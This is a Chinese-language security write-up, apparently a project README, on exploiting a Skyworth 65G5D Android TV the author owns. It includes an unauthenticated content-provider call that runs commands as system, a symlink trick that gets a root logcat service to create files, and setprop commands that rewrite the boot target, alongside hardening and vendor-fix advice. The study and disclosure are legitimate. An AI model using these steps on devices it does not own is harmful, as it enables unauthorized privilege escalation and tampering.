# 权限是怎么拿到的：一次真实的逆向 + 利用过程

> **责任声明**
> 全部过程在**我自己购买的这台电视**上完成：创维 65G5D（`1AA45_G5D` / 主板 `skyT963_8A001_P31` / Amlogic T963），
> 固件 `PPR1.180610.011.20241227`（`user/dev-keys`，Android 9）。
>
> 目的：这台机器不给 root（`ro.debuggable=0`、无 `su`、`/data` 块设备 `0600`），
> 而我要把开机广告和酷开首页换掉，并让开机直接进自己的直播。
>
> - 都是**自有设备本地安全评估**，用于自我加固与向厂商反馈，**不针对任何第三方设备**。
> - 完整漏洞清单（含 CVSS、证据快照、修复建议）在 **[docs/创维65G5D-安全漏洞清单.md](docs/创维65G5D-安全漏洞清单.md)**。
> - 发现同类问题请**先报厂商**，给它修复窗口，再谈披露。

---

## 一、结论：这台机器上的"权限"到底是什么

没有 root shell，也没有一步到位的提权；真实收益是两样东西的组合：

| 收益 | 来源 | 换来了什么 |
|---|---|---|
| **system(uid 1000) 身份执行命令** | V1：`com.tianci.provider` 无鉴权 | 以 system 身份 `mkdir` / `pm install` / `reboot` |
| **root 身份创建文件** | V2：`/data/log` 0777 + root logcat 跟随符号链接 | 在 root 目录造出 `/data/ccos/customStart` |
| **启动项被改写** | 厂商开机规则 `bootintent.xml` 第 17 条 | 开机直接拉起指定组件 → **现在的 TVDesk 是这样进来的** |

再叠加 V5（SELinux 全局 Permissive）作为放大器，以及 V4（root 守护进程 socket 世界可读写，能注入按键）、
V6（安装校验可关，静默装包）。

**一句话**：不是"破解 root"，而是"厂商自己留了三扇门，我把它们串起来当成权限用"。

---

## 二、怎么发现的（真实顺序，不是事后编排）

### 阶段 1：先把设备摸清（ADB shell，只读）

网络 ADB 出厂就是开着的（`service.adb.tcp.port=5555`、`adb_enabled=1`），所以起点不是漏洞，是一条**默认敞开的调试通道**：

```console
$ adb connect 192.168.31.123:5555
$ adb shell id
uid=2000(shell) gid=2000(shell) ...
$ adb shell getprop ro.build.type; getprop ro.debuggable
user
0
```

`user` 版本 + `ro.debuggable=0` + 没有 `su` → 别指望 `adb root`。要动开机行为，只能从 **APK 层**找口子。

### 阶段 2：全量 dump `/system`，反编译系统应用

```bash
adb shell "tar -cf - /system 2>/dev/null" | tar -xf -      # 实测 3,225 文件 / 1.67 GB
```

工具链（清单附录 C 有完整表）：

| 用途 | 工具 |
|---|---|
| 反编译 / 全局检索 | **REA 6.7.0**（`rea`）+ `jadx-headless-mcp.jar` |
| 清单 / 资源 | `apktool.jar`（系统 APK 要 `--frame-path`） |
| dex 级 | `baksmali/smali`（dex-tools 2.4）、`cfr.jar` |

在 `com.tianci.system`（`/system/app/SkySystemService/SkySystemService.apk`，12.3 MB，targetSdk 28）里 grep 关键字：

```
execLinuxCmd   →  com.tianci.provider.business.CommonProvider.execLinuxCmd
CommonProvider →  com.tianci.provider.SystemContentProvider
```

**发现点 1**：这个 provider 暴露给所有应用，而 `call()` 里**没有任何 `Binder.getCallingUid()` 校验**。

### 阶段 3：确认暴露面，然后写探针验证

```console
$ adb shell dumpsys package com.tianci.system | grep -A3 "ContentProvider"
      Authorities: com.tianci.provider
```

写了 13 KB 的探针 `com.dsh.sysprobe` 去实际调用（PoC 见清单 V1）：

```java
Uri URI = Uri.parse("content://com.tianci.provider");
Bundle data = new Bundle();
data.putInt("cmd", 6);                        // 6 = mkdir
data.putString("param", "/data/system/poc");
Bundle wrap = new Bundle();
wrap.putParcelable("param", data);
wrap.putBoolean("method_set", true);
Bundle res = getContentResolver().call(URI, "COMMON", "execLinuxCmd", wrap);
```

普通应用（uid 10048）→ `ret = true`，`/data/system/poc` 以 `system:system` 建出来。
**没有 SecurityException，没有任何权限声明** —— V1 成立。

### 阶段 4：顺着启动行为往下挖，发现开机规则是「文件存在 + 属性非空」

```console
$ adb shell cat /system/etc/bootintent.xml
<home name="customStart"  propcomp="persist.sys.custom.pkg/persist.sys.custom.cls">
        <file type="exists">/data/ccos/customStart</file>
</home>
```

**发现点 2**：开机拉起谁，由「一个文件存不存在」+「两条 persist 属性能不能读到」决定。
属性那半边 shell 就能写，文件那半边在 `/data/ccos`（root 目录，shell 写不进去）—— 缺一块。

### 阶段 5：找到能往 root 目录写文件的那一环

```console
$ adb shell ls -ld /data/log
drwxrwxrwx 3 log log 4096 /data/log          # 0777，谁都能建文件

$ adb shell sed -n '110,132p' /vendor/etc/init/hw/init.skyworth.rc
service getlogservice /system/bin/logcat -v threadtime -f /data/log/log.txt
    user root
    group root
    disabled
```

**发现点 3**：`/data/log` 世界可写，而 root 的 `logcat -f` 会**跟随符号链接**打开文件。
于是把 `log.txt` 换成指向 `/data/ccos/customStart` 的软链，等 root logcat 一起来，root 目录里就"凭空"出现一个文件。

更省事的是：厂商自己的看门狗 `/vendor/bin/getlog.sh`（`logcatdog`）会循环 `start getlogservice`，
**不需要我去触发**。

```bash
adb shell ln -sf /data/ccos/customStart /data/log/log.txt
adb shell setprop ctl.start getlogservice        # 想让它在几秒内发生就手动踢一脚（V3）
```

普通 shell 建成软链，几十秒后：

```console
$ adb shell ls -ld /data/ccos
drwx------ 4 system system 4096 /data/ccos        # 目录里的 customStart 已经在了
```

**V2 成立。** 注意它的能力边界：写入内容是 logcat 输出、内容不可控、权限固定 `0600`、不能覆盖已有文件——
所以它的价值是「**文件存在性开关**」，不是任意内容写。

### 阶段 6：把两半拼起来，改写开机行为

```bash
# 文件条件：V2 造出来的 /data/ccos/customStart（已在）
# 属性条件：shell 直接写（persist.* 本来就归 shell 管）
adb shell setprop persist.sys.custom.pkg com.gathin.tvhome
adb shell setprop persist.sys.custom.cls com.gathin.tvhome.MainActivity
adb reboot
```

开机约 20 秒后直接落在 `com.gathin.tvhome/.MainActivity` —— 酷开首页和开机广告都不见了，
**没有 root、没有改 `/system` 一个字节**。

**这就是现在这台电视上 TVDesk 的来历。**

---

## 三、完整链路（当前机器上的实际状态）

```
① 入口        ADB 5555（出厂默认开）→ shell(uid 2000)
                    │
② 侦察        全量 dump /system（3,225 文件 / 1.67 GB）
              REA 6.7.0 + jadx 反编译 SkySystemService.apk
              命中 CommonProvider.execLinuxCmd / SystemContentProvider
                    │
③ V1 提权     普通应用 call("content://com.tianci.provider", "execLinuxCmd")
              → system(1000) 执行 mkdir / pm install / reboot，无任何校验
                    │
④ V2 造文件   ln -sf /data/ccos/customStart /data/log/log.txt
              logcatdog → start getlogservice（root）→ logcat 跟随软链
              → /data/ccos/customStart（root 目录里出现）
                    │
⑤ V3/V5 放大  SELinux Permissive → setprop ctl.start / ctl.stop 任意 init 服务
                    │
⑥ 改写启动    setprop persist.sys.custom.pkg  com.gathin.tvhome
              setprop persist.sys.custom.cls  com.gathin.tvhome.MainActivity
                    │
⑦ 生效        system_server 读 /system/etc/bootintent.xml 第 17 条
              文件存在 ✓ + 两条属性非空 ✓ → startActivity(目标组件)
                    │
                    ▼
              开机 ≈20 秒 → TVDesk（原厂首页、开机广告不再出现）
```

### 六项缺陷一览

| 编号 | 缺陷 | 谁能用 | 实际收益 |
|---|---|---|---|
| **V1** | `com.tianci.provider` 无鉴权 system 命令执行 | **任意已装应用** | system(1000) 跑 `mkdir`/`pm install`/`reboot` |
| **V2** | `/data/log` 0777 + root logcat 跟随软链 | 应用或 shell | root 目录里创建 root:root 0600 文件 |
| **V3** | Permissive 下任意 init 服务启停 | shell | 启停 root 服务（也是 V2 的触发器） |
| **V4** | root 守护进程 socket `srwx---rwx` | **任意已装应用** | 读状态、`set:keycode:` 注入按键 |
| **V5** | SELinux 全局 Permissive | — | 以上每环都不被拦截 |
| **V6** | `persist.sys.disable.install.verify=1` | shell | 静默装包，不用电视上点确认 |

`V1 + V2 + V5` 是端到端跑通的那条链；`V4` 复核仍可从普通应用调通。

---

## 四、这套权限换来了什么（现在的 TVDesk）

| 能力 | 用到的环节 | 没有它之前 |
|---|---|---|
| 开机直达 TVDesk，酷开首页不出现 | V2 造文件 + 开机规则 #17 | 开机先进酷开首页，看 15 秒广告 |
| 开机直达直播 | 同上（目标组件换 `LivePlayerActivity`） | 要拿遥控器按 4~5 次 |
| 静默安装调试包 | V6 关安装校验 | 每次装包在电视上点"确定"，还要重试 4~8 次 |
| 桌面里切 HDMI / 回电视源 | 厂商 provider `com.skyworth.tv.sdk.provider`（另一处无鉴权，见文末） | 只能回原厂首页找输入源 |
| 遥控器按键注入（自动化测试用） | V4 `/data/socketsys/sys_info` | 靠人手按 |

代价与边界（如实记录）：

- **不是 root**：改不了 `/system`、`/vendor`，装不了 Magisk，`adb root` 依旧不可用；
- V2 造出来的文件**内容不可控**，只能当开关用；
- 一次固件 OTA 就可能把这些路径全部修掉 / 换个位置，所以 TVDesk 里对每条链路都做了**失败降级**
  （属性写不进去就退回 `set-home-activity`，见 `MainActivity.armHomeProps()`）。

---

## 五、现在的设备状态（2026-11-15 复核）

```console
$ adb shell getprop ro.build.fingerprint
Skyworth/skyT963_8A001_P31/T963:9/PPR1.180610.011/20241227:user/dev-keys

$ adb shell getprop persist.sys.disable.install.verify      # V6
1

$ adb shell ls -ld /data/log; ls -l /data/log/log.txt        # V2，软链还上着膛
drwxrwxrwx 3 log log 4096 2026-10-21 20:52 /data/log
lrwxrwxrwx 1 shell shell 22 2026-10-21 20:52 /data/log/log.txt -> /data/ccos/customStart

$ adb shell ls -ld /data/ccos                                # V2 的产物目录
drwx------ 4 system system 4096 2026-11-15 15:07 /data/ccos

$ adb shell cat /system/etc/bootintent.xml | grep -A3 customStart
<home name="customStart"  propcomp="persist.sys.custom.pkg/persist.sys.custom.cls">
        <file type="exists">/data/ccos/customStart</file>
</home>

$ adb shell ls -l /data/socketsys/; getprop init.svc.socketsys   # V4
srwx---rwx 1 root root 0 2026-11-15 15:32 sys_info
running

$ adb shell getprop persist.sys.custom.pkg                   # 当前指向
com.gathin.tvhome
```

**结论：这套链条不是一次性实验，它就是这台电视每天的开机路径。**

---

## 六、为什么不直接用「persist 属性」了事

最早我也以为光写 `persist.sys.custom.pkg` 就够了（这台机器 SELinux Permissive，普通 App 都能 `setprop`）。
但把 `bootintent.xml` 读完才明白：**第 17 条是「文件存在 **且** 属性非空」的组合条件**。

- 只写属性 → 文件不存在 → 规则不触发 → 开机还是进酷开首页；
- 只造文件 → 属性为空 → 一样不触发。

所以 V2 那一环不是可有可无的"锦上添花"，而是**启动链的必要条件**。
这也是为什么改造里要"上膛"一次 `/data/ccos/customStart` —— 它是开关，不是内容。

---

## 七、边界：能做什么，不能做什么

| 能做 | 不能做 |
|---|---|
| 改开机拉起谁（组合条件） | 改 `/system`、`/vendor`（只读） |
| 以 system 身份建目录 / 装包 / 重启 | 拿 root shell（`ro.debuggable=0`、无 `su`） |
| 静默装包（关安装校验） | 读 `/data/ccos` 里的文件（`system:system 0700`） |
| 注入按键、读设备状态（V4） | 装 Magisk / 改 boot.img / 解锁 BL |
| 启停任意 init 服务（V3） | 绕过 DRM / 付费（没试过，也不打算） |

---

## 八、加固建议

**用户侧（降低暴露面）**

```bash
adb shell settings put global adb_enabled 0
adb shell setprop service.adb.tcp.port -1
```
或者把电视放进访客 VLAN，只放行自己电脑到 5555。

**厂商侧（真正要修的）**

| 优先级 | 修什么 |
|---|---|
| P0 | V1：provider 改 `exported="false"` 或加 signature 权限，`call()` 里校验 `Binder.getCallingUid()` |
| P0 | V2：`/data/log` 改 `0770`，`logcat` 打开文件加 `O_NOFOLLOW` |
| P0 | V5：出厂 `enforcing`，补 `getlogservice`/`socketsys`/`cmdexecutor` 的域策略 |
| P1 | V4：socket 改 `0660 root:system` + `SO_PEERCRED` 校验，`socketsys` 建专用域（现在跑在 `u:r:shell:s0`） |
| P1 | 开机规则别用「文件存在」当条件，改包签名/allowlist |
| P2 | V3：`ctl.*` 属性加调用方 UID 白名单 |
| P2 | V6：删掉 `persist.sys.disable.install.verify` |

---

## 九、附：另一处顺手发现的无鉴权 provider

切 HDMI / 回电视源用的厂商 provider，**我的 App 一个权限都没申请**就能调：

```java
private static final Uri URI = Uri.parse("content://com.skyworth.tv.sdk.provider/method");
ctx.getContentResolver().call(URI, "METHOD_GOTO_SOURCE", null, bundle);        // 切输入源
ctx.getContentResolver().call(URI, "METHOD_FORCE_RELEASE_SOURCE", null, null); // 释放当前源
ctx.getContentResolver().call(URI, "METHOD_BACK_TO_TV", null, null);           // 回电视
```

任何装在这台电视上的应用都能抢/放电视画面。正常应该用 signature 权限保护。
（没算进 V1~V6 的评分，因为它是"能力外溢"不是"提权"，但影响面同样要注意。）

---

## 十、想自己复现的话

```bash
# 1) 摸清底子
adb shell getprop ro.build.fingerprint
adb shell getprop ro.boot.selinux              # permissive 才谈得上后面
adb shell getprop ro.debuggable                # 0 = 没有 adb root

# 2) 看暴露的 provider
adb shell dumpsys package com.tianci.system | grep -A3 ContentProvider

# 3) 看开机规则
adb shell cat /system/etc/bootintent.xml | grep -A3 customStart

# 4) 看 V2 的条件（软链 + 权限）
adb shell ls -ld /data/log; adb shell ls -l /data/log/log.txt

# 5) 看 V4 的 socket
adb shell ls -l /data/socketsys/

# 6) 看当前启动项指向
adb shell getprop persist.sys.custom.pkg; adb shell getprop persist.sys.custom.cls
```

> 只适用于我这一台（`1AA45_G5D` / `PPR1.180610.011.20241227`）。
> **不要拿去操作不属于你的设备**；发现同类问题建议先联系厂商。
